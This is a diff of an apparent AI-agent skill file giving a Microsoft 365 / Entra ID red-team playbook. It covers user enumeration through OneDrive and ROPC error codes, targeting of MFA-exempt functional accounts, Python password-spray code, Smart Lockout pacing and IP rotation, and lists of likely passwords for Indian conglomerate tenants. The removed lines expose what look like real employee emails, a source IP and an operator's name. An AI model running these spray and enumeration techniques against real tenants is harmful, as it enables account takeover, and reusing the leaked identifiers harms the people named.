@@ -1,7 +1,7 @@
 ---
 name: m365-entra-attack
-description: Microsoft 365 / Entra ID red-team attack chain — current 2026 reality. AADSTS code reference, user enumeration vectors (with hardening status), Smart Lockout math, Conditional Access bypass options, ROPC + SAML SSO browser flow, Burp/Playwright templates. Built from a paid external red-team engagement against an a large enterprise (redacted-client, May 2026) where 1,996 ROPC attempts surfaced 247 pre-existing lockouts, 1 valid CA-blocked credential, and confirmed real-time external attacker activity. Use for any M365/Entra credential attack, password spray, user enumeration, CA-bypass exploration, or active-attacker-detection scenario.
-sources: redacted-client-redteam-2026, microsoft-docs, AADInternals
+description: Microsoft 365 / Entra ID red-team attack chain — current 2026 reality. AADSTS code reference, user enumeration vectors (with hardening status), Smart Lockout math, Conditional Access bypass options, ROPC + SAML SSO browser flow, Burp/Playwright templates. Built from a paid external red-team engagement against a large Indian manufacturing conglomerate (May 2026) where ~2,000 ROPC attempts surfaced ~250 pre-existing lockouts, 1 valid CA-blocked credential, and confirmed real-time external attacker activity. Use for any M365/Entra credential attack, password spray, user enumeration, CA-bypass exploration, or active-attacker-detection scenario.
+sources: engagement-redacted, microsoft-docs, AADInternals
 report_count: 1
 ---
 
@@ -25,9 +25,9 @@ DO NOT use for:
 
 ```bash
 # For each owned domain
-msftrecon -d redacted-client.com
-msftrecon -d redacted-clientltd.com
-msftrecon -d redacted-brand2school.com
+msftrecon -d client.example
+msftrecon -d clientltd.example
+msftrecon -d sister-brand-school.example
 ```
 
 Key fields in output:
@@ -114,6 +114,20 @@ Host: <tenant>-my.sharepoint.com
 - Microsoft is hardening these endpoints over time — re-verify before relying on it
 - Some users may exist in Entra without OneDrive provisioning (license-dependent) — false negatives possible
 
+**2026-05-17 re-verification (engagement-redacted revalidation):** The OneDrive enum primitive STILL WORKS as of 2026-05-17. Calibration: licensed users return HTTP 200 with ~57KB body; nonexistent users / shared-mailbox accounts return 404 with 0 bytes. The /personal/ root path (without /_layouts/15/onedrive.aspx) returns the same differential.
+
+**Killer use case: license differential = account-class signal.** Cross-reference OneDrive 200/404 with ROPC AADSTS50034/50126:
+
+| OneDrive | ROPC | Classification |
+|---|---|---|
+| 200 | AADSTS50076 (MFA req) or 50126 | **Licensed regular user** (real employee, MFA enforced) |
+| 200 | AADSTS50034 | (shouldn't happen — inconsistency, investigate) |
+| 404 | AADSTS50126 | **Shared mailbox / functional / service account** (no OneDrive license, has password) — historic MFA-exempt class, prime target for password guessing |
+| 404 | AADSTS50034 | Doesn't exist in tenant |
+| 404 | AADSTS50076 | Edge case (functional account WITH MFA enforced — rare) |
+
+The OneDrive-404 + ROPC-50126 combination is **the signal for "functional account that might bypass MFA"** — admins frequently exempt these from CA policies because they're used by automation that can't satisfy MFA. Discovered usefulness on engagement-redacted revalidation: identified `noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@` as functional-account candidates (typical for any conglomerate tenant).
+
 **ROPC AADSTS50034 / AADSTS50126 differential:**
 - AADSTS50034 (user not exist) does NOT increment Smart Lockout counter
 - AADSTS50126 (wrong password) DOES increment
@@ -173,7 +187,11 @@ def attempt(email, password):
     req.add_header("Content-Type", "application/x-www-form-urlencoded")
     try:
         r = urllib.request.urlopen(req, context=ctx, timeout=15)
-        return {"status": "VALID", "body": json.loads(r.read())}
+        body = json.loads(r.read())
+        # PARSE AS JSON — see CRITICAL TRAP below about substring matching
+        if "access_token" in body:    # ← JSON key check, NOT substring
+            return {"status": "VALID", "body": body}
+        return {"status": "STATUS_200_NO_TOKEN", "body": body}
     except urllib.error.HTTPError as e:
         msg = e.read().decode(errors="ignore")
         for code, status in [
@@ -188,6 +206,26 @@ def attempt(email, password):
                 return {"status": status, "code": code}
         return {"status": "OTHER", "msg": msg[:200]}
 ```
+
+### ⚠ CRITICAL TRAP — AADSTS50076 body contains literal `"access_token"` substring
+
+When CA policy requires MFA and ROPC cannot satisfy it, Entra returns an error body that INCLUDES a `claims` field listing CA policy IDs as a step-up challenge:
+
+```json
+{
+  "error": "invalid_grant",
+  "error_description": "AADSTS50076: ...you must use multi-factor authentication...",
+  "error_codes": [50076],
+  "suberror": "basic_action",
+  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id-1>\",\"<policy-id-2>\"]}}}"
+}
+```
+
+**The `"access_token"` substring appears inside the CA claims challenge JSON.** A loose substring check `if "access_token" in raw_body:` will false-positive every MFA-blocked attempt as a successful token issuance.
+
+**Always parse JSON, then check `if "access_token" in parsed_dict:`** — never substring-match on OAuth error bodies. This was discovered in the 2026-05-17 engagement-redacted revalidation where a substring check produced 7 false-positive "CA bypasses" on Sway/Yammer/Bookings/Tunnel client_ids that were actually all enforcing MFA correctly.
+
+The `claims.access_token.capolids` values are tenant-internal Conditional Access policy IDs — useful recon enrichment, but NOT a token. Document them in engagement notes as "CA policy IDs that fired" — they're a defender-side breadcrumb, not an attacker-side win.
 
 **Pace:**
 - Per-IP: ≤30 req/sec is fine; Microsoft tolerates well
@@ -239,8 +277,8 @@ async def saml_validate(target_sp_url, username, password, screenshot_dir):
             return "MFA_REQUIRED"  # cred valid, MFA wall
         elif "we couldn't sign you in" in low or "wrong" in low:
             return "INVALID"
-        elif "infrawatch" in low or "dashboard" in low:
-            return "FULL_SUCCESS"  # session obtained
+        elif "<post-auth-landing-marker>" in low or "dashboard" in low:
+            return "FULL_SUCCESS"  # session obtained (replace marker per target app)
         return "UNCLEAR"
 ```
 
@@ -263,12 +301,12 @@ This is the **highest-impact byproduct** of any M365 spray engagement. Always tr
 
 ## Common password patterns to spray (Indian-conglomerate-specific)
 
-- `<BrandName>@<Year>` — `redacted-client@2026`, `redacted-brand2@2026`, `Tata@2026`
-- `<BrandName>@123` — `redacted-client@123` (very common)
-- `<PlantCity>@<Year>` — `Hirakud@2026`, `Beawar@2026` (cement plant cities)
+- `<BrandName>@<Year>` — `<Brand>@2026`, `Tata@2026`
+- `<BrandName>@123` — `<Brand>@123` (very common)
+- `<PlantCity>@<Year>` — `<City1>@2026`, `<City2>@2026` (production plant cities)
 - `<EmployeeID-as-password>` — common in legacy apps (PAN number, employee code, phone last4)
 - `Password@<year>`, `Welcome@<year>`, `Admin@<year>` — generic defaults
-- `<BrandName>@<Y2-digits>` — `redacted-client@26`
+- `<BrandName>@<Y2-digits>` — `<Brand>@26`
 
 **Engagement caveat:** when client provides leaked-cred dumps (stealer logs), use those FIRST. Each leaked cred is 1 cap-attempt against the strongest known guess for that user.
 
@@ -278,24 +316,24 @@ This is the **highest-impact byproduct** of any M365 spray engagement. Always tr
 
 Every M365 attempt logs to JSONL:
 ```json
-{"ts":"2026-05-08T14:40:53","email":"chetan.sharma@redacted-client.com","pw_first4":"Shre","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
+{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
 ```
 
 **Per-user tracker** (atomic):
 ```json
-{"chetan.sharma@redacted-client.com": 1, "dipti.bhoi@redacted-client.com": 1, ...}
+{"user1@<client>.example": 1, "user2@<client>.example": 1, ...}
 ```
 
 **IP rotation log** (per-day):
 ```
-2026-05-08	49.36.184.19	Reliance Jio Delhi	Sachin (Lucideus)	Round 2 spray
+2026-05-08	<src-ip>	<ISP-AS>	<operator-handle>	Round 2 spray
 ```
 
 These three artifacts are deliverable evidence for the report. They survive into the next engagement as state.
 
 ---
 
-## Real-world findings template (from redacted-client engagement)
+## Real-world findings template (from engagement-redacted)
 
 For the report:
 
